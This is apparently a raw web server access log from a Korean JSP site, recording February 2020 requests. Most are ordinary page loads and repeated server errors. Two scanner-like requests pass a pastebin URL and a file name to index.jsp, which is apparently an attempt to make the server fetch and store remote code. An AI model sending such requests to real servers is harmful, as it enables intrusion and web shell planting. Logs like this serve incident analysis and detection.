211.214.19.243 - - [02/Feb/2020:23:48:47 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 44336
211.214.19.243 - - [02/Feb/2020:23:48:51 +0900] "GET /home/whoweare/china.do HTTP/1.1" 200 11536
211.214.19.243 - - [02/Feb/2020:23:49:08 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 44336
211.214.19.243 - - [02/Feb/2020:23:49:10 +0900] "GET /home/whoweare/china.do HTTP/1.1" 200 11536
78.135.113.119 - - [02/Feb/2020:23:51:10 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
159.65.65.204 - - [02/Feb/2020:23:51:11 +0900] "GET /index.jsp HTTP/1.1" 302 -
78.135.113.119 - - [02/Feb/2020:23:51:11 +0900] "GET /index.jsp HTTP/1.1" 302 -
78.135.113.119 - - [02/Feb/2020:23:51:12 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
78.135.113.119 - - [02/Feb/2020:23:51:12 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
78.135.113.119 - - [02/Feb/2020:23:51:13 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
78.135.113.119 - - [02/Feb/2020:23:51:14 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
78.135.113.119 - - [02/Feb/2020:23:51:15 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
78.135.113.119 - - [02/Feb/2020:23:51:15 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
78.135.113.119 - - [02/Feb/2020:23:51:16 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
159.65.65.204 - - [02/Feb/2020:23:51:16 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
78.135.113.119 - - [02/Feb/2020:23:51:16 +0900] "GET /index.jsp?testingfsoc=1&url=https://pastebin.com/raw/i1gLLhHJ&filename=wpdemos HTTP/1.1" 302 -
159.65.65.204 - - [02/Feb/2020:23:51:17 +0900] "GET /index.jsp HTTP/1.1" 302 -
78.135.113.119 - - [02/Feb/2020:23:51:17 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
159.65.65.204 - - [02/Feb/2020:23:51:18 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
78.135.113.119 - - [02/Feb/2020:23:51:18 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
78.135.113.119 - - [02/Feb/2020:23:51:18 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
159.65.65.204 - - [02/Feb/2020:23:51:23 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
159.65.65.204 - - [02/Feb/2020:23:51:23 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
159.65.65.204 - - [02/Feb/2020:23:51:24 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
159.65.65.204 - - [02/Feb/2020:23:51:24 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
159.65.65.204 - - [02/Feb/2020:23:51:30 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
159.65.65.204 - - [02/Feb/2020:23:51:36 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
159.65.65.204 - - [02/Feb/2020:23:51:36 +0900] "GET /index.jsp?testingfsoc=1&url=https://pastebin.com/raw/i1gLLhHJ&filename=wpdemos HTTP/1.1" 302 -
159.65.65.204 - - [02/Feb/2020:23:51:42 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
159.65.65.204 - - [02/Feb/2020:23:51:48 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
